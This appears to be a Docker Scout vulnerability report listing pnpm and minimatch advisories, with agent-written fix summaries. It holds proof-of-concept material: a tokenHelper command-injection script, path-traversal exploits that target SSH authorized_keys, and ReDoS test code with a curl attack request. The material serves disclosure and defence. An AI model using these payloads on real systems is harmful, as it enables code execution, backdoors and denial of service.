- The final patch rejects all three collision forms, applies the same exactness to deny rules, accepts exact opaque keys as positive controls, and continues to accept registry packages approved without their peer suffixes.

## Files changed

- `building/policy/src/index.ts` and `building/policy/test/index.ts` normalize only parsed registry identities and retain exact opaque keys.
- `pacquet/crates/package-manager/src/build_modules.rs` passes snapshot identities to policy, matches TypeScript package-separator parsing, and preserves opaque locators.
- `pacquet/crates/package-manager/src/build_modules/tests.rs` covers exact approval and denial, all three collision forms, ignored-build output, and registry peer compatibility.
- `.changeset/quiet-opaque-build-identities.md` records patch releases for `@pnpm/building.policy` and `pnpm`.

## Commands run

```text
$ jest building/policy/test/index.ts --runInBand
16 passed
$ cargo test -p pacquet-package-manager build_modules::tests -- --nocapture
49 passed
$ cargo fmt --all -- --check
PASS
$ git diff --check 84bb4b1a046f3a659de1c9aab1d45dcf814124ce...HEAD
PASS
```

## Validation

- The TypeScript policy suite passed all 16 tests.
- The final pacquet build-policy suite passed all 49 tests.
- The new Rust regression reproduced the extra-`@` collision before the additive fix and passed afterward.
- Exact opaque approval and denial, source-only semver-tail collision rejection, registry peer normalization, and ignored-build reporting all have paired tests.
- ESLint passed on the changed TypeScript source and test files.
- Rust formatting and diff checks passed; the branch is clean and consists of three focused security commits plus additive merges of upstream through `84bb4b1a046f3a659de1c9aab1d45dcf814124ce`.
- The focused TypeScript suite and ESLint ran directly through the installed harness. The isolated project build cannot resolve workspace packages without a local install, and the configured registry gateway returns HTTP 403 while fetching `@pnpm/pacquet@0.11.2`; no candidate-focused test failed.

## Patches

`10.34.2`: https://github.com/pnpm/pnpm/commit/14bceb1e0b2a71f4f670774db261feb03f38ec23
`11.5.3`: https://github.com/pnpm/pnpm/commit/bf1b731ee6c0ea98709e671ff0f46bf654480ab8

## Compatibility

Registry package approvals keep their existing form. Opaque dependencies that were approved through a normalized parenthesized variant must now use the exact key shown in pnpm's ignored-build output. This is the intended trust-boundary change; no package-resolution or artifact format changes.

## CI note

GitHub intentionally does not run status checks on temporary private-fork pull requests. The complete policy suites, formatting, and diff checks above are the applicable validation: https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability

---
Written by an agent (Codex, GPT-5).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69263?s=github&n=pnpm&t=npm&vr=%3C10.26.0"><img alt="high 7.5: CVE--2025--69263" src="https://img.shields.io/badge/CVE--2025--69263-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Download of Code Without Integrity Check</i>

<table>
<tr><td>Affected range</td><td><code><10.26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.310%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

HTTP tarball dependencies (and git-hosted tarballs) are stored in the lockfile without integrity hashes. This allows the remote server to serve different content on each install, even when a lockfile is committed.

### Details

When a package depends on an HTTP tarball URL, pnpm's tarball resolver returns only the URL without computing an integrity hash:

`resolving/tarball-resolver/src/index.ts`:
```javascript
return {
  resolution: {
    tarball: resolvedUrl,
    // No integrity field
  },
  resolvedVia: 'url',
}
```

The resulting lockfile entry has no integrity to verify:
```yaml
remote-dynamic-dependency@http://example.com/pkg.tgz:
  resolution: {tarball: http://example.com/pkg.tgz}
  version: 1.0.0
```

Since there is no integrity hash, pnpm cannot detect when the server returns different content. 

This affects:
- HTTP/HTTPS tarball URLs (`"pkg": "https://example.com/pkg.tgz"`)
- Git shorthand dependencies (`"pkg": "github:user/repo"`)
- Git URLs (`"pkg": "git+https://github.com/user/repo"`)

npm registry packages are not affected as they include integrity hashes from the registry metadata.

### PoC

See attached [pnpm-bypass-integrity-poc.zip](https://github.com/user-attachments/files/23819648/pnpm-bypass-integrity-poc.zip)

The POC includes:
- A server that returns different tarball content on each request
- A `malicious-package` that depends on the HTTP tarball
- A `victim` project that depends on `malicious-package`

To run:
```bash
cd pnpm-bypass-integrity-poc
./run-poc.sh
```

The output shows that each install (with `pnpm store prune` between them) downloads different code despite having a committed lockfile.

### Impact

An attacker who publishes a package with an HTTP tarball dependency can serve different code to different users or CI/CD environments. This enables:

- Targeted attacks based on request metadata (IP, headers, timing)
- Evasion of security audits (serve benign code during review, malicious code later)
- Supply chain attacks where the malicious payload changes over time

The attack requires the victim to install a package that has an HTTP/git tarball in its dependency tree. The victim's lockfile provides no protection.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69262?s=github&n=pnpm&t=npm&vr=%3E%3D6.25.0%2C%3C10.27.0"><img alt="high 7.5: CVE--2025--69262" src="https://img.shields.io/badge/CVE--2025--69262-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code>>=6.25.0<br/><10.27.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.27.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.949%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

A command injection vulnerability exists in pnpm when using environment variable substitution in `.npmrc` configuration files with `tokenHelper` settings. An attacker who can control environment variables during pnpm operations could achieve remote code execution (RCE) in build environments.

## Affected Components

- **Package**: pnpm
- **Versions**: All versions using `@pnpm/config.env-replace` and `loadToken` functionality
- **File**: `pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts` - `loadToken()` function
- **File**: `pnpm/config/config/src/readLocalConfig.ts` - `.npmrc` environment variable substitution

## Technical Details

### Vulnerability Chain

1. **Environment Variable Substitution**
   - `.npmrc` supports `${VAR}` syntax
   - Substitution occurs in `readLocalConfig()`

2. **loadToken Execution**
   - Uses `spawnSync(helperPath, { shell: true })`
   - Only validates absolute path existence

3. **Attack Flow**
```
.npmrc: registry.npmjs.org/:tokenHelper=${HELPER_PATH}
   ↓
envReplace() → /tmp/evil-helper.sh
   ↓
loadToken() → spawnSync(..., { shell: true })
   ↓
RCE achieved
```

### Code Evidence

**`pnpm/config/config/src/readLocalConfig.ts:17-18`**
```typescript
key = envReplace(key, process.env)
ini[key] = parseField(types, envReplace(val, process.env), key)
```

**`pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts:60-71`**
```typescript
export function loadToken(helperPath: string, settingName: string): string {
  if (!path.isAbsolute(helperPath) || !fs.existsSync(helperPath)) {
    throw new PnpmError('BAD_TOKEN_HELPER_PATH', ...)
  }
  const spawnResult = spawnSync(helperPath, { shell: true })
  // ...
}
```

## Proof of Concept

### Prerequisites
- Private npm registry access
- Control over environment variables
- Ability to place scripts in filesystem

### PoC Steps

```bash
# 1. Create malicious helper script
cat > /tmp/evil-helper.sh << 'SCRIPT'
#!/bin/bash
echo "RCE SUCCESS!" > /tmp/rce-log.txt
echo "TOKEN_12345"
SCRIPT
chmod +x /tmp/evil-helper.sh

# 2. Create .npmrc with environment variable
cat > .npmrc << 'EOF'
registry=https://registry.npmjs.org/
registry.npmjs.org/:tokenHelper=${HELPER_PATH}
EOF

# 3. Set environment variable (attacker controlled)
export HELPER_PATH=/tmp/evil-helper.sh

# 4. Trigger pnpm install
pnpm install  # RCE occurs during auth

# 5. Verify attack
cat /tmp/rce-log.txt
```

### PoC Results
```
==> Attack successful
==> File created: /tmp/rce-log.txt
==> Arbitrary code execution confirmed
```

## Impact

### Severity
- **CVSS Score**: 7.6 (High)
- **CVSS Vector**: cvss:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

### Affected Environments

**High Risk:**
- CI/CD pipelines (GitHub Actions, GitLab CI)
- Docker build environments
- Kubernetes deployments
- Private registry users

**Low Risk:**
- Public registry only
- Production runtime (no pnpm execution)
- Static sites

### Attack Scenarios

**Scenario 1: CI/CD Supply Chain**
```
Repository → Build Trigger → pnpm install → RCE → Production Deploy
```

**Scenario 2: Docker Build**
```dockerfile
FROM node:20
ARG HELPER_PATH=/tmp/evil
COPY .npmrc .
RUN pnpm install  # RCE
```

**Scenario 3: Kubernetes**
```
Secret Control → Env Variable → .npmrc Substitution → RCE
```

## Mitigation

### Temporary Workarounds

**Disable tokenHelper:**
```ini
# .npmrc
# registry.npmjs.org/:tokenHelper=${HELPER_PATH}
```

**Use direct tokens:**
```ini
//registry.npmjs.org/:_authToken=YOUR_TOKEN
```

**Audit environment variables:**
- Review CI/CD env vars
- Restrict .npmrc changes
- Monitor build logs

### Recommended Fixes

1. Remove `shell: true` from loadToken
2. Implement helper path allowlist
3. Validate substituted paths
4. Consider sandboxing

## Disclosure

- **Discovery**: 2025-11-02
- **PoC**: 2025-11-02
- **Report**: [Pending disclosure decision]

## References

- Repository: https://github.com/pnpm/pnpm
- Affected: `@pnpm/config.env-replace@^3.0.2`
- Similar: CVE-2024-53866, CVE-2023-37478

## Credit

Reported by: Jiyong Yang
Contact: sy2n0@naver.com

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-50015?s=github&n=pnpm&t=npm&vr=%3C10.34.0"><img alt="high 7.3: CVE--2026--50015" src="https://img.shields.io/badge/CVE--2026--50015-lightgrey?label=high%207.3&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><10.34.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.270%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

pnpm's patch application pipeline (`@pnpm/patch-package`) performs no path validation on file paths extracted from `.patch` files. An attacker who contributes a malicious patch file via a pull request can write attacker-controlled content to or delete arbitrary files on the filesystem during `pnpm install`, as the user running the install. The `diff --git` header paths containing `../../` sequences traverse out of the package directory, and the traversal is difficult to catch in code review because patch file diff headers are opaque to most reviewers.

## Vulnerability Details

During `pnpm install`, when a `patchedDependencies` entry is present in `pnpm-workspace.yaml`, pnpm reads the referenced `.patch` file and applies it via the embedded `@pnpm/patch-package` library. The `applyPatchToDir` function at `patching/apply-patch/src/index.ts:12-13` calls `process.chdir(opts.patchedDir)`, setting the working directory to the installed package location deep inside `node_modules/.pnpm/`.

The patch parser at `@pnpm/patch-package/dist/patch/parse.js:88` extracts file paths from `diff --git a/(.*?) b/(.*?)` headers using a regex with no path sanitization. The `executeEffects` function in `apply.js` then operates on these unsanitized paths:

**File write** (`apply.js:35-49`):
```javascript
case 'file creation': {
  const eff = effect
  fs.ensureDirSync(dirname(eff.path))
  fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })
  break
}
```

**File delete** (`apply.js:13-22`):
```javascript
case 'file deletion': {
  const eff = effect
  // TODO: integrity checks
  if (!opts.dryRun) {
    fs.unlinkSync(eff.path)
  }
  break
}
```

A path like `../../../../../../../../../../home/user/.ssh/authorized_keys` in the patch header traverses out of the package directory to an arbitrary location.

## Proof of Concept

```bash
# Write variant:
bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
# Result: PASS -- /tmp/vuln6_pwned created with attacker-controlled content

# Delete variant:
bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
# Result: PASS -- /tmp/vuln7_target deleted by malicious patch

# Combined chain (delete + replace SSH authorized_keys):
bash autofyn_audit/exploits/chain2_patch_ssh_backdoor/exploit.sh
# Result: PASS -- authorized_keys replaced with attacker's public key
```

## Impact

Arbitrary file write and delete as the user running `pnpm install`, limited to paths writable by that user. An attacker who submits a PR adding a `.patch` file and `patchedDependencies` config can target SSH authorized_keys, shell configuration, CI/CD files, or other writable files. Patch files may receive less review scrutiny than `package.json` changes because the `../` traversal sequences are in `diff --git` headers that look like patch metadata.

## Suggested Remediation

Validate parsed patch file paths against the package root directory. Reject any path that resolves outside the patched package directory via `path.resolve` + prefix check. Alternatively, sanitize at parse time by rejecting paths containing `..` components in `parse.js`.

---

> Discovered by [AutoFyn](https://github.com/SignalPilot-Labs/AutoFyn)
> Full audit report: [audit_report.md](https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md)
> Exploit script: [exploit.sh](https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh)

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-fr4h-3cph-29xv?s=github&n=pnpm&t=npm&vr=%3C10.34.4"><img alt="high 7.1: GHSA--fr4h--3cph--29xv" src="https://img.shields.io/badge/GHSA--fr4h--3cph--29xv-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><10.34.4</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The hoisted dependency alias issue tracked as GHSA-fr4h-3cph-29xv / CAND-PNPM-059 has been addressed in both pnpm and pacquet.

A crafted lockfile alias could be joined directly under a hoisted `node_modules` directory. Traversal aliases could escape that directory, while reserved aliases such as `.bin` or `.pnpm` could overwrite pnpm-owned layout. This patch validates package-name semantics and path containment before graph insertion or filesystem work.

## Security boundary

- The TypeScript hoisted graph uses the shared safe join helper at the actual `dep.name` sink.
- The helper rejects traversal, absolute, platform-specific, and reserved package names.
- Pacquet validates the hoister's `dep.0.name` before adding the graph node or recursing.
- Both implementations return `ERR_PNPM_INVALID_DEPENDENCY_NAME`.
- Pacquet uses the same dependency-name containment rule at its hoisted graph sink as it uses for direct dependency aliases.

## Exploit replay

Before the patch, a traversal alias in a hoisted lockfile imported package files outside the intended install root. With this patch, both pnpm and pacquet reject the alias before graph insertion or filesystem work, and the escaped file is not created.

## Files changed

- `fs/symlink-dependency/src/safeJoinModulesDir.ts` provides the TypeScript containment helper.
- `installing/deps-restorer/src/lockfileToHoistedDepGraph.ts` validates the parsed dependency name at the hoisted graph sink.
- `pacquet/crates/package-manager/src/{hoisted_dep_graph.rs,safe_join_modules_dir.rs}` mirrors that boundary in Rust.
- TypeScript and Rust tests cover traversal, reserved aliases, and valid scoped names.

## Commands run

```text
$ pnpm --filter @pnpm/fs.symlink-dependency test
PASS: 24 tests
$ pnpm --filter @pnpm/installing.deps-restorer test test/index.ts
PASS: exploit regression and positive install control
$ cargo test --locked -p pacquet-package-manager --lib
PASS: 426 tests
$ cargo fmt --all -- --check
PASS
```

## Validation

- TypeScript symlink helper: 24 passed.
- TypeScript exploit regression: 1 passed.
- TypeScript positive hoisted-install control: 1 passed.
- Targeted strict TypeScript compiles: passed.
- Targeted ESLint: zero errors.
- Pacquet helper tests: 3 passed.
- Full pacquet package-manager library suite: 426 passed.
- `cargo fmt`, parsed two-document lockfile validation, and `git diff --check`: passed.

## Patch

Ready-for-review private PR: https://github.com/pnpm/pnpm-ghsa-fr4h-3cph-29xv/pull/1

GitHub reports the branch as mergeable and has requested review from `zkochan`. GitHub intentionally does not run status checks on temporary private-fork PRs; the commands and outcomes above are the recorded local validation: https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability

## Compatibility

Valid unscoped and scoped package aliases continue to work. The changeset covers `@pnpm/fs.symlink-dependency`, `@pnpm/installing.deps-restorer`, and `pnpm`; pacquet is updated in the same commit for CLI parity.

---
Written by an agent (Codex, GPT-5).

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-72r4-9c5j-mj57?s=github&n=pnpm&t=npm&vr=%3C10.34.4"><img alt="high 7.1: GHSA--72r4--9c5j--mj57" src="https://img.shields.io/badge/GHSA--72r4--9c5j--mj57-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><10.34.4</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The `patch-remove` deletion-scope issue tracked as GHSA-72r4-9c5j-mj57 / CAND-PNPM-030 has been addressed in pnpm.

A crafted patch entry could resolve outside the configured patches directory and cause `pnpm patch-remove` to delete an arbitrary reachable file. This patch validates the configured directory and every resolved target before unlinking anything, then deletes the final directory entry without following it.

## Security boundary

- Traversal and absolute paths that resolve outside the configured patches directory are rejected before deletion.
- Parent directories are canonicalized before deletion, including the case where a nested symlink points outside and the final outside entry is itself dangling.
- The complete batch is validated before any file is removed.
- Component-aware predicates accept valid names beginning with `..` while still rejecting parent traversal, Windows drive escapes, and UNC escapes.
- Valid files and symlinked patch directories whose canonical targets remain below the lockfile directory continue to work.
- A final symlink inside a valid patch directory is unlinked without following its target, including when the target is outside or dangling.

## Exploit replay

Before the patch, a workspace `patchedDependencies` path that resolved outside the project caused `pnpm patch-remove` to delete the external sentinel. A second replay used a nested parent symlink and a dangling outside victim: `realpath()` returned `ENOENT`, yet the victim was still removed. With this patch, both paths are rejected and the outside entries remain intact.

## Files changed

- `patching/commands/src/isSubdirectory.ts` performs component-aware containment checks.
- `patching/commands/src/patchRemove.ts` validates the full batch, canonicalizes parents, and unlinks final entries without following them.
- `patching/commands/test/{isSubdirectory,patchRemove}.test.ts` covers traversal, nested symlinks, dangling victims, and valid removals.

## Commands run

```text
$ pnpm --filter @pnpm/patching.commands test test/isSubdirectory.test.ts test/patchRemove.test.ts
PASS: 11 tests across 2 suites
$ pnpm --filter @pnpm/patching.commands run compile
PASS
$ git diff --check
PASS
```

## Validation

- Focused handler and path-predicate suites: 11 passed across 2 suites.
- Package-wide ESLint: passed.
- Package TypeScript build: passed.
- Commit hooks, Commitlint, and `git diff --check`: passed.
- The broader integration harness was environment-blocked because it writes outside the available temporary root; focused handler tests used `/private/tmp`.

## Patches

`10.34.4`: https://github.com/pnpm/pnpm/commit/352ae489f1b14ffdc19d2c6eacb1b06b098c2ddc
`11.7.0`: https://github.com/pnpm/pnpm/commit/612a2e6a7333f2b061f452a21b6e62c1c161747f

## Compatibility

Missing patch files remain no-ops. Valid symlinked patch directories continue to work when their canonical target stays inside the lockfile directory, and final symlinks are removed without touching their targets. `patch-remove` is not yet in pacquet's command surface, so no Rust-side parity change is required.

## Remaining risk

Portable Node APIs do not expose directory-fd-relative `unlinkat()`. A local attacker who can replace an already validated parent directory before the unlink may still win a time-of-check/time-of-use race. The reproduced repository-controlled traversal and symlink paths do not require that concurrent capability and are blocked by this patch.

---
Written by an agent (Codex, GPT-5).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>minimatch</strong> <code>9.0.5</code> (npm)</summary>

<small><code>pkg:npm/minimatch@9.0.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-26996?s=github&n=minimatch&t=npm&vr=%3E%3D9.0.0%2C%3C9.0.6"><img alt="high 8.7: CVE--2026--26996" src="https://img.shields.io/badge/CVE--2026--26996-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.519%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
### Impact
Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

----

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27904?s=github&n=minimatch&t=npm&vr=%3E%3D9.0.0%2C%3C9.0.7"><img alt="high 7.5: CVE--2026--27904" src="https://img.shields.io/badge/CVE--2026--27904-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.0.7</code></td></tr>
<tr><td>Fixed version</td><td><code>9.0.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.472%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
